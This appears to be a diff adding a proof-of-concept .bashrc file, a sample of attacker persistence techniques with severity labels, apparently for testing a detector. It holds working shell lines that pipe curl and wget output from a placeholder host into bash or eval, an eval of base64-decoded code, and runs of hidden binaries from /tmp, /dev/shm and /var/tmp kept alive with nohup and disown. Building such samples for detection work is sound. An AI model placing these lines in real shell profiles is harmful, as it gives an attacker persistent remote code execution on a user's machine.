@@ -1,0 +1,51 @@
+# ============================================================
+# POC: Malicious .bashrc injection — harmless sample
+# Simulates what an attacker appends to ~/.bashrc or /etc/bash.bashrc
+# to gain persistence on every interactive shell login.
+# Copy to a user's ~/.bashrc or /etc/bash.bashrc to test.
+# ============================================================
+
+# --- Legitimate-looking preamble (attacker camouflage) ---
+export HISTSIZE=1000
+export EDITOR=vim
+
+# --- Technique 1: eval of base64-encoded payload ---
+# Severity: HIGH
+# eval + base64 is the gold standard for obfuscated shell persistence.
+# The b64 string below decodes to: echo "poc harmless"  — never executed here.
+eval $(echo ZWNobyAicG9jIGhhcm1sZXNzIgo= | base64 -d)
+
+# --- Technique 2: curl piped to bash on every shell start ---
+# Severity: HIGH
+# Fetches a remote script every time the user opens a terminal.
+# Ensures the attacker always has a fresh payload even after cleanup.
+# 192.0.2.1 is TEST-NET (RFC 5737) — unreachable.
+curl http://192.0.2.1/implant.sh | bash
+
+# --- Technique 3: eval of wget output ---
+# Severity: HIGH
+# Identical goal to the curl variant — uses wget as an alternative lolbin.
+eval $(wget -q -O - http://192.0.2.1/config.sh)
+
+# --- Technique 4: execution from /tmp/ on shell start ---
+# Severity: HIGH
+# Drops a persistent backdoor in /tmp/ and re-runs it on each login.
+# Path alone is the detection signal — file does not exist in this POC.
+/tmp/.bashrc_helper
+
+# --- Technique 5: execution from /dev/shm/ ---
+# Severity: HIGH
+# RAM-based tmpfs — leaves no on-disk artefact after reboot.
+/dev/shm/.ipc_agent
+
+# --- Technique 6: nohup background execution ---
+# Severity: LOW
+# Forks a long-running process and detaches it from the shell,
+# so it survives the user logging out.
+nohup /var/tmp/.beacon >/dev/null 2>&1 &
+
+# --- Technique 7: disown ---
+# Severity: LOW
+# Removes the background job from the shell's job table,
+# preventing SIGHUP from killing it on logout.
+/var/tmp/.watcher & disown
